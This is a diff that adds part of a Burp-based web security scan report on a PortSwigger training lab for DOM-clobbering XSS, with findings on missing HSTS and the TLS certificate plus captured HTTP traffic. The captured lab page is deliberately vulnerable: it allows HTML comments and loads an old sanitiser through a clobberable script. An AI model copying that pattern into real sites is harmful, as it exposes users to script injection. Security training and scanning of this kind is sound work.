+                    &lt;span id='user-comments'&gt;
+                    &lt;script src='/resources/js/domPurify-2.0.15.js'&gt;&lt;/script&gt;
+                    &lt;script src='/resources/js/loadCommentsWithDomClobbering.js'&gt;&lt;/script&gt;
+                    &lt;script&gt;loadComments('/post/comment')&lt;/script&gt;
+                    &lt;/span&gt;
+                    &lt;hr&gt;
+                    &lt;section class=&quot;add-comment&quot;&gt;
+                        &lt;h2&gt;Leave a comment&lt;/h2&gt;
+                        &lt;form action=&quot;/post/comment&quot; method=&quot;POST&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
+                            &lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;qVERC0jcmucaknU47CmZ9w2CNyPMe6O6&quot;&gt;
+                            &lt;input required type=&quot;hidden&quot; name=&quot;postId&quot; value=&quot;1&quot;&gt;
+                            &lt;label&gt;Comment:&lt;/label&gt;
+                            &lt;div&gt;HTML is allowed&lt;/div&gt;
+                            &lt;textarea required rows=&quot;12&quot; cols=&quot;300&quot; name=&quot;comment&quot;&gt;&lt;/textarea&gt;
+                                    &lt;label&gt;Name:&lt;/label&gt;
+                                    &lt;input required type=&quot;text&quot; name=&quot;name&quot;&gt;
+                                    &lt;label&gt;Email:&lt;/label&gt;
+                                    &lt;input required type=&quot;email&quot; name=&quot;email&quot;&gt;
+                                    &lt;label&gt;Website:&lt;/label&gt;
+                                    &lt;input pattern=&quot;(http:|https:).+&quot; type=&quot;text&quot; name=&quot;website&quot;&gt;
+                            &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Post Comment&lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                    &lt;div class=&quot;is-linkback&quot;&gt;
+                        &lt;a href=&quot;/&quot;&gt;Back to Blog&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [burp] Strict transport security not enforced (2 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: CERTAIN) [+1 more URL(s): https://0abb00c50377a549817352fe00530037.web-security-academy.net/post/comment] @ https://0abb00c50377a549817352fe00530037.web-security-academy.net/post</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r5lsf-81</code> — <code>artifacts/_/ev-mr6r5lsf-81/</code></div><div class="lbl">REQUEST</div><pre>GET /post HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+
+GET /post?postId=1 HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 10649
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsBlog.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;blog&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;div class=&quot;blog-post&quot;&gt;
+                    &lt;img src=&quot;/image/blog/posts/21.jpg&quot;&gt;
+                    &lt;h1&gt;The Do&amp;apos;s &amp;amp; Don&amp;apos;ts of Writing Your Resume&lt;/h1&gt;
+                    &lt;p&gt;&lt;span id=blog-author&gt;Dean N&amp;apos;Mean&lt;/span&gt; | 10 June 2026&lt;/p&gt;
+                    &lt;hr&gt;
+                    &lt;p&gt;We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&amp;apos;t make it a sweaty limp one.&lt;/p&gt;
+                    &lt;p&gt;The first thing to remember is don&amp;apos;t try and be funny in your job descriptions. If you&amp;apos;ve been working with children the employer doesn&amp;apos;t want to read &amp;apos;could have given them a smack most days, but loved them really&amp;apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.&lt;/p&gt;
+                    &lt;p&gt;Swearing is usually frowned upon. Just because you&amp;apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&amp;apos;t mean it&amp;apos;s true, or that you should use bad language in your profile.&lt;/p&gt;
+                    &lt;p&gt;If you are presenting a hard copy of your resume at interview your future boss doesn&amp;apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.&lt;/p&gt;
+                    &lt;p&gt;Don&amp;apos;t include anything you can&amp;apos;t live up to. Applying to become a ski instructor when you can&amp;apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&amp;apos;t do it don&amp;apos;t include it. Picture everyone&amp;apos;s embarrassment when you have stated you can &amp;apos;do it blindfolded&amp;apos; and you knock over the 15th-century porcelain vase contai</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [burp] TLS certificate</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The server presented a valid, trusted TLS certificate. This issue is purely informational.&lt;br&gt;&lt;br&gt;The server presented the following certificates:&lt;br&gt;&lt;br&gt;&lt;h4&gt;Server certificate&lt;/h4&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued to:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued by:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Amazon RSA 2048 M01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Valid from:&lt;/b&gt;&amp;nbsp;&amp;nb @ https://0abb00c50377a549817352fe00530037.web-security-academy.net/</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r5ls1-7z</code> — <code>artifacts/_/ev-mr6r5ls1-7z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0</pre></div>
+</div>
+</body></html>
